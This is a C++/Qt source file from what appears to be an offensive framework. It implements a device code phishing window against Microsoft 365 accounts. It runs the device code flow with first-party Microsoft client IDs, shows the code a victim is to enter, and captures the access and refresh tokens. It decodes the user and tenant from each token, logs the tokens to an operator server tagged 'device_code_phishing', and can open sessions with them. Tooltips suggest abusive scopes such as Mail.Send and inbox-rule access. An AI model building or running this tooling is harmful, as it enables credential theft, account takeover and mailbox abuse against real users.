#include "DeviceCodeLoginWindow.h"
#include "DeviceCodeWorker.h"
#include "DashboardWindow.h"
#include "network/ClientTransport.h"
#include "TokenStore.h"
#include "../shared/Protocol.h"
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QLabel>
#include <QPushButton>
#include <QThread>
#include <QUuid>
#include <QTextBrowser>
#include <QJsonObject>
#include <QJsonDocument>
#include <QApplication>
#include <QClipboard>
#include <QTimer>
#include <QMessageBox>
#include <QDebug>

// Helper to decode JWT claims
static inline QString b64UrlDecodeToJsonField(const QString &jwt, const char *field) {
    const QStringList parts = jwt.split('.');
    if (parts.size() < 2) return QString();
    QByteArray payload = parts.at(1).toUtf8();
    int pad = (4 - (payload.size() % 4)) % 4;
    payload.append(QByteArray(pad, '='));
    payload = QByteArray::fromBase64(payload, QByteArray::Base64UrlEncoding);
    QJsonObject o = QJsonDocument::fromJson(payload).object();
    return o.value(field).toString();
}

DeviceCodeLoginWindow::DeviceCodeLoginWindow(DashboardWindow *dashboard, QWidget *parent)
    : QWidget(parent), parentDashboard(dashboard) {
    setAttribute(Qt::WA_DeleteOnClose);
    setWindowTitle("Device Code Token Capture");
    resize(700, 600);

    QVBoxLayout *layout = new QVBoxLayout(this);

    layout->addWidget(new QLabel("Client ID"));
    clientId = new QLineEdit();
    clientId->setPlaceholderText("e.g., 1950a258-227b-4e31-a9cf-717495945fc2 (Azure PowerShell)");
    layout->addWidget(clientId);

    layout->addWidget(new QLabel("Resource (Scope / Audience)"));
    resourceInput = new QLineEdit("https://graph.microsoft.com/.default");
    layout->addWidget(resourceInput);

    layout->addWidget(new QLabel("Additional Scopes (space-separated, optional)"));
    additionalScopesInput = new QLineEdit();
    additionalScopesInput->setPlaceholderText("e.g., MailboxSettings.ReadWrite Mail.Send User.Read");
    additionalScopesInput->setToolTip("Add extra scopes here. Common ones:\n"
                                       "- MailboxSettings.ReadWrite (inbox rules)\n"
                                       "- Mail.Send (send emails)\n"
                                       "- Files.ReadWrite.All (SharePoint/OneDrive)\n"
                                       "- Directory.Read.All (directory enumeration)");
    layout->addWidget(additionalScopesInput);

    layout->addWidget(new QLabel("User-Agent (optional override)"));
    uaInput = new QLineEdit("Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) ...");
    layout->addWidget(uaInput);

    // Session creation toggle
    createSessionCheckbox = new QCheckBox("Create session from captured token");
    createSessionCheckbox->setChecked(false);
    createSessionCheckbox->setToolTip("When enabled, automatically creates a PowerShell session after capturing tokens");
    layout->addWidget(createSessionCheckbox);

    QPushButton *loginBtn = new QPushButton("Send Device Code Flow");
    connect(loginBtn, &QPushButton::clicked, this, &DeviceCodeLoginWindow::performDeviceCodeLogin);
    layout->addWidget(loginBtn);

    layout->addWidget(new QLabel("Login Status"));
    statusArea = new QVBoxLayout();
    QWidget *container = new QWidget();
    container->setLayout(statusArea);
    container->setMinimumHeight(300);
    container->setStyleSheet("background-color: #121212; border: 1px solid #333; padding: 6px;");
    layout->addWidget(container);

    wireTransport();
}

void DeviceCodeLoginWindow::performDeviceCodeLogin() {
    // Validate inputs
    QString clientIdText = clientId->text().trimmed();
    if (clientIdText.isEmpty()) {
        QMessageBox::warning(this, "Missing Client ID",
            "Please enter a Client ID.\n\nCommon options:\n"
            "• Azure PowerShell: 1950a258-227b-4e31-a9cf-717495945fc2\n"
            "• Microsoft Graph: 14d82eec-204b-4c2f-b7e8-296a70dab67e");
        return;
    }

    QString id = QUuid::createUuid().toString();
    createStatusWidget(id);

    // Combine resource with additional scopes
    QString fullScope = resourceInput->text().trimmed();
    QString additionalScopes = additionalScopesInput->text().trimmed();

    // Known first-party Microsoft client IDs that don't support dynamic consent
    static const QStringList firstPartyClientIds = {
        "1950a258-227b-4e31-a9cf-717495945fc2",  // Azure PowerShell
        "d3590ed6-52b3-4102-aeff-aad2292ab01c",  // Microsoft Office
        "1fec8e78-bce4-4aaf-ab1b-5451cc387264",  // Microsoft Teams
        "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  // Azure CLI
        "4765445b-32c6-49b0-83e6-1d93765276ca",  // OfficeHome/Authenticator
        "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0",  // SharePoint
        "ab9b8c07-8f02-4f72-87fa-80105867a763",  // OneDrive SyncEngine
        "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8",  // Microsoft Bing Search
        "27922004-5251-4030-b22d-91ecd9a37ea4",  // Outlook Mobile
    };

    bool isFirstParty = firstPartyClientIds.contains(clientIdText.toLower());

    if (!additionalScopes.isEmpty()) {
        if (isFirstParty && fullScope.contains(".default")) {
            // First-party apps with .default: IGNORE additional scopes (dynamic consent not allowed)
            QMessageBox::warning(this, "First-Party App Limitation",
                QString("The client ID you're using is a Microsoft first-party application.\n\n"
                        "First-party apps cannot request additional scopes beyond what Microsoft "
                        "has pre-authorized. Your additional scopes will be IGNORED.\n\n"
                        "To request specific scopes like Chat.Read, you must:\n"
                        "1. Register your own Azure AD application, OR\n"
                        "2. Use .default only and hope Chat scopes are pre-authorized\n\n"
                        "Proceeding with .default only..."));
            // Keep fullScope as-is (just .default)
        } else if (fullScope.contains(".default")) {
            // Custom app with .default: Replace with explicit scopes
            QString baseResource = fullScope;
            baseResource.remove("/.default");
            baseResource = baseResource.trimmed();

            QStringList scopeList = additionalScopes.split(' ', Qt::SkipEmptyParts);
            QStringList qualifiedScopes;
            for (const QString &scope : scopeList) {
                if (scope.startsWith("https://") || scope == "offline_access" ||
                    scope == "openid" || scope == "profile" || scope == "email") {
                    qualifiedScopes << scope;
                } else {
                    qualifiedScopes << (baseResource + "/" + scope);
                }
            }
            fullScope = qualifiedScopes.join(" ");
        } else {
            // No .default, just append
            fullScope += " " + additionalScopes;
        }
    }

    QThread *thread = new QThread();
    DeviceCodeWorker *worker = new DeviceCodeWorker(
        clientId->text(), fullScope, uaInput->text(), id
    );
    worker->moveToThread(thread);

    connect(thread, &QThread::started, worker, &DeviceCodeWorker::run);
    connect(worker, &DeviceCodeWorker::resultReceived, this, &DeviceCodeLoginWindow::handleResult);
    connect(worker, &DeviceCodeWorker::errorOccurred, this, &DeviceCodeLoginWindow::handleError);

    // Proper cleanup: worker signals thread to quit, thread cleans up both
    connect(worker, &DeviceCodeWorker::finished, thread, &QThread::quit);
    connect(worker, &DeviceCodeWorker::finished, worker, &QObject::deleteLater);
    connect(thread, &QThread::finished, thread, &QObject::deleteLater);

    thread->start();
}

void DeviceCodeLoginWindow::createStatusWidget(const QString &labelId) {
    QVBoxLayout *box = new QVBoxLayout();

    // Always QTextBrowser
    QTextBrowser *label = new QTextBrowser();
    label->setText("Initializing...");
    label->setOpenExternalLinks(true);
    label->setReadOnly(true);
    label->setFixedHeight(150);
    label->setStyleSheet("QTextBrowser { background-color: #1e1e1e; color: #e0e0e0; padding: 4px; }");

    QFont consolas("Consolas");
    consolas.setStyleHint(QFont::Monospace);
    label->setFont(consolas);

    box->addWidget(label);

    // Copy Code button
    QHBoxLayout *btnLayout = new QHBoxLayout();
    QPushButton *copyBtn = new QPushButton("Copy Code");
    copyBtn->setEnabled(false);  // Disabled until we get a user code
    copyBtn->setStyleSheet("QPushButton { background-color: #2a5298; color: white; padding: 4px 12px; border-radius: 3px; }"
                           "QPushButton:hover { background-color: #3a62a8; }"
                           "QPushButton:disabled { background-color: #444; color: #888; }");
    connect(copyBtn, &QPushButton::clicked, this, [this, labelId]() {
        if (statusWidgets.contains(labelId) && !statusWidgets[labelId].userCode.isEmpty()) {
            QApplication::clipboard()->setText(statusWidgets[labelId].userCode);
            // Brief visual feedback
            statusWidgets[labelId].copyBtn->setText("Copied!");
            QTimer::singleShot(1500, this, [this, labelId]() {
                if (statusWidgets.contains(labelId)) {
                    statusWidgets[labelId].copyBtn->setText("Copy Code");
                }
            });
        }
    });
    btnLayout->addWidget(copyBtn);
    btnLayout->addStretch();
    box->addLayout(btnLayout);

    QWidget *wrapper = new QWidget();
    wrapper->setLayout(box);
    wrapper->setStyleSheet("margin-bottom: 10px; background-color: #1e1e1e; border: 1px solid #444; padding: 4px; color: #e0e0e0;");

    StatusWidget sw{label, wrapper, copyBtn, QString()};
    statusWidgets[labelId] = sw;
    statusArea->addWidget(wrapper);
}

void DeviceCodeLoginWindow::handleResult(const QString &labelId, const QVariantMap &result) {
    if (!statusWidgets.contains(labelId)) return;
    QTextBrowser *label = statusWidgets[labelId].label;   // 🔹 FIXED

    if (result.contains("stage") && result["stage"].toString() == "device_code") {
        QString url = result["verification_uri"].toString();
        QString code = result["user_code"].toString();
        label->setHtml(QString("<b>Waiting:</b> Go to <a href='%1' style='color:#4da6ff'>%1</a> and enter code <b>%2</b>")
                       .arg(url, code));
        label->setOpenExternalLinks(true);

        // Store user code and enable copy button
        statusWidgets[labelId].userCode = code;
        statusWidgets[labelId].copyBtn->setEnabled(true);
        return;
    }

    if (result.contains("access_token")) {
        QString accessToken = result.value("access_token").toString();
        QString refreshToken = result.value("refresh_token").toString();
        QString scope = result.value("scope").toString();

        label->setOpenExternalLinks(false);
        label->setPlainText(QString("Access Token Received\n\nScope:\n%1\n\nAccess Token:\n%2\n\nRefresh Token:\n%3")
                            .arg(scope, accessToken, refreshToken));

        // Store token in TokenStore for plugin auto-linking
        QString sessionId = QString("device_code_%1").arg(QUuid::createUuid().toString(QUuid::WithoutBraces));
        TokenInfo tokenInfo;
        tokenInfo.accessToken = accessToken;
        tokenInfo.refreshToken = refreshToken;
        tokenInfo.resource = resourceInput->text();  // The resource used for device code
        TokenStore::instance()->storeToken(sessionId, tokenInfo);

        // Log token to server
        logTokenToServer(accessToken, refreshToken, scope);

        // If user wants to create a session from this token
        if (createSessionCheckbox->isChecked()) {
            QString resource = resourceInput->text();
            // Extract resource from scope if it's a .default scope
            if (resource.endsWith("/.default")) {
                resource = resource.left(resource.length() - 9);  // Remove /.default
            }
            createSessionFromToken(accessToken, refreshToken, resource);
        }
    } else {
        label->setOpenExternalLinks(false);
        label->setPlainText("[!] Login failed.");
    }
}

void DeviceCodeLoginWindow::handleError(const QString &labelId, const QString &message) {
    if (!statusWidgets.contains(labelId)) return;
    QTextBrowser *label = statusWidgets[labelId].label;
    label->setOpenExternalLinks(false);
    label->setPlainText("[!] Error: " + message);
}

QObject* DeviceCodeLoginWindow::locateTransport() const {
    if (auto *t = qApp->findChild<ClientTransport*>()) return t;
    if (auto *o = qApp->findChild<QObject*>("ClientTransport")) return o;
    return nullptr;
}

void DeviceCodeLoginWindow::logTokenToServer(const QString &accessToken,
                                              const QString &refreshToken,
                                              const QString &scope)
{
    if (accessToken.isEmpty()) {
        return; // Nothing to log
    }

    QObject *transportObj = locateTransport();
    if (!transportObj) {
        qWarning() << "[DeviceCode] Cannot log token: no transport found";
        return;
    }

    // Generate a unique session ID for device code phishing
    QString sessionId = QString("device_code_%1").arg(QUuid::createUuid().toString(QUuid::WithoutBraces));

    // Extract claims from JWT for proper logging
    QString upn = b64UrlDecodeToJsonField(accessToken, "upn");
    if (upn.isEmpty()) {
        upn = b64UrlDecodeToJsonField(accessToken, "preferred_username");
    }
    if (upn.isEmpty()) {
        upn = b64UrlDecodeToJsonField(accessToken, "unique_name");
    }
    QString tenantId = b64UrlDecodeToJsonField(accessToken, "tid");
    QString aud = b64UrlDecodeToJsonField(accessToken, "aud");

    // Determine resource from scope or aud claim
    QString resource = resourceInput->text();
    if (resource.endsWith("/.default")) {
        resource = resource.left(resource.length() - 9);  // Remove /.default
    }
    if (resource.isEmpty()) {
        resource = aud;
    }

    QJsonObject req;
    req.insert(Protocol::F_ACTION, Protocol::ACTION_LOG_TOKEN);
    req.insert("sessionId", sessionId);
    req.insert("source", "device_code_phishing");
    req.insert("accessToken", accessToken);
    if (!refreshToken.isEmpty() && refreshToken != "[No refresh token returned]")
        req.insert("refreshToken", refreshToken);
    if (!scope.isEmpty())
        req.insert("scope", scope);
    if (!upn.isEmpty())
        req.insert("user", upn);
    if (!tenantId.isEmpty())
        req.insert("tenantId", tenantId);
    if (!resource.isEmpty())
        req.insert("resource", resource);

    if (auto *typed = qobject_cast<ClientTransport*>(transportObj)) {
        typed->sendJson(req);
    } else {
        QMetaObject::invokeMethod(transportObj, "sendJson", Q_ARG(QJsonObject, req));
    }

    qDebug() << "[DeviceCode] Token logged to server for session:" << sessionId << "user:" << upn;
}

void DeviceCodeLoginWindow::wireTransport() {
    QObject *transportObj = locateTransport();
    if (!transportObj || hookConnected) return;

    if (auto *typed = qobject_cast<ClientTransport*>(transportObj)) {
        connect(typed, &ClientTransport::messageReceived, this,
                [this](const QJsonObject &obj) {
                    const QString act = obj.value(Protocol::F_ACTION).toString();
                    const QString status = obj.value(Protocol::F_STATUS).toString();
                    const QString respRid = obj.value("rid").toString();
                    const QString sid = obj.value("sessionId").toString();

                    // Match only our pending rid
                    if (!pendingRid.isEmpty() && !respRid.isEmpty() && respRid != pendingRid)
                        return;

                    if (act == QStringLiteral("session_created")) {
                        if (sessionHandled) return;
                        sessionHandled = true;
                        pendingRid.clear();

                        const QString user = obj.value("user").toString("Unknown");
                        const QString tenantId = obj.value("tenantId").toString("N/A");
                        const QString domain = obj.value("domain").toString("N/A");
                        const QString res = obj.value("resource").toString("N/A");

                        // Store token in TokenStore for the new session
                        TokenInfo tokenInfo;
                        tokenInfo.accessToken = pendingAccessToken;
                        tokenInfo.refreshToken = pendingRefreshToken;
                        tokenInfo.resource = pendingResource;
                        TokenStore::instance()->storeToken(sid, tokenInfo);

                        // Update dashboard
                        if (parentDashboard) {
                            parentDashboard->addSessionRow(sid, user, tenantId, domain, res);
                            parentDashboard->logEvent(
                                QString("[+] Session created from device code for %1 (ID: %2)").arg(user, sid));
                            parentDashboard->setSessionTokenExpiry(sid, pendingAccessToken,
                                pendingRefreshToken, pendingResource, tenantId);
                        }

                        // Clear pending state
                        pendingAccessToken.clear();
                        pendingRefreshToken.clear();
                        pendingResource.clear();

                        QMessageBox::information(this, "Session Created",
                            QString("Session created for %1\nTenant: %2\nSession: %3")
                            .arg(user, tenantId, sid));
                        return;
                    }

                    // Handle errors
                    const bool isError = (act == QStringLiteral("error")) ||
                                        (status == Protocol::STATUS_ERR);
                    if (isError && !pendingRid.isEmpty()) {
                        if (sessionHandled) return;
                        sessionHandled = true;
                        pendingRid.clear();
                        const QString msg = obj.value("message").toString("Unknown error");
                        if (parentDashboard) {
                            parentDashboard->logEvent(QString("[-] Session creation failed: %1").arg(msg));
                        }
                        QMessageBox::warning(this, "Session Creation Failed",
                            QString("Failed to create session: %1\n\nTokens were still captured and logged.")
                            .arg(msg));
                    }
                });
        hookConnected = true;
    }
}

void DeviceCodeLoginWindow::createSessionFromToken(const QString &accessToken,
                                                    const QString &refreshToken,
                                                    const QString &resource)
{
    QObject *transportObj = locateTransport();
    if (!transportObj) {
        QMessageBox::warning(this, "No Connection",
            "Cannot create session: not connected to server.\nTokens were still captured and logged.");
        return;
    }

    // Decode JWT claims
    QString aud = b64UrlDecodeToJsonField(accessToken, "aud");
    QString upn = b64UrlDecodeToJsonField(accessToken, "upn");
    QString tid = b64UrlDecodeToJsonField(accessToken, "tid");
    QString domain = upn.contains('@') ? upn.section('@', 1, 1) : QStringLiteral("UnknownDomain");

    // Use provided resource or fallback to aud claim
    QString finalResource = resource.isEmpty() ? aud : resource;
    if (finalResource.isEmpty()) {
        finalResource = QStringLiteral("https://graph.microsoft.com");
    }

    // Store pending state for response handling
    sessionHandled = false;
    pendingRid = QUuid::createUuid().toString(QUuid::WithoutBraces);
    pendingAccessToken = accessToken;
    pendingRefreshToken = refreshToken;
    pendingResource = finalResource;

    // Build session request
    QJsonObject req;
    req.insert(Protocol::F_ACTION, Protocol::ACTION_NEW_SESSION);
    req.insert("mode", QStringLiteral("tokens"));
    req.insert("resource", finalResource);
    req.insert("rid", pendingRid);
    req.insert("accessToken", accessToken);
    if (!refreshToken.isEmpty()) req.insert("refreshToken", refreshToken);
    if (!upn.isEmpty()) req.insert("user", upn);
    if (!tid.isEmpty()) req.insert("tenantId", tid);
    if (!domain.isEmpty()) req.insert("domain", domain);

    if (auto *typed = qobject_cast<ClientTransport*>(transportObj)) {
        typed->sendJson(req);
    } else {
        QMetaObject::invokeMethod(transportObj, "sendJson", Q_ARG(QJsonObject, req));
    }

    qDebug() << "[DeviceCode] Session creation requested for" << upn;
}
